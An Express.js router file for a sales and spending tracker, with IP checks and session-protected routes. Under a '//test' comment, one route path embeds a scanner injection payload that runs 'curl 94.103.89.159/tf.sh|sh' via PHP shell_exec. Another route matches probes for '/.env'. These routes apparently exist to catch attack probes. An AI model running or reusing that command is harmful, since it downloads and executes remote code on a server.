'use strict';

const express = require('express');
const router = express.Router();
const sessionAuth = require('../middlewares/sessionauth');

//Controller
const ctrl = require('./home.ctrl');
const ip = require('../middlewares/ip');

//Rendering Pages
router.get('/', ip.checkip, ctrl.output.home);
router.get('/login', ip.checkip, ctrl.output.login);
router.get('/finder', ip.checkip, ctrl.output.finder);
router.get('/table', ip.checkip, ctrl.output.table);

router.get('/logout', ip.checkip, ctrl.auth.logout);
router.get(
  '/table/:year/:month',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.get.monthInfo
);
router.get(
  '/table/:year/:month/:day',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.get.dayInfo
);

router.get(
  '/spending/:year/:month',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.get.spendingInfo
);
//POST
router.post('/login', ip.checkip, ctrl.process.post.login);
router.post('/register', ip.checkip, ctrl.process.post.register);
router.post('/finder', ip.checkip, ctrl.process.post.finder);
router.post(
  '/sales',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.post.sales
);
router.post(
  '/spending',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.post.spending
);

//UPDATE
router.put(
  '/spending',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.put.spending
);
router.put(
  '/sales',
  ip.checkip,
  sessionAuth.checkSession,
  ctrl.process.put.sales
);

//test
router.get(
  '/?a=fetch&content=<php>die(shell_exec("curl%2094.103.89.159/tf.sh|sh"))</php>',
  ip.checkip,
  ctrl.process.test
);
router.get('/.env', ip.checkip, ctrl.process.test);
router.get('/test/ip', ip.checkip);

module.exports = router;
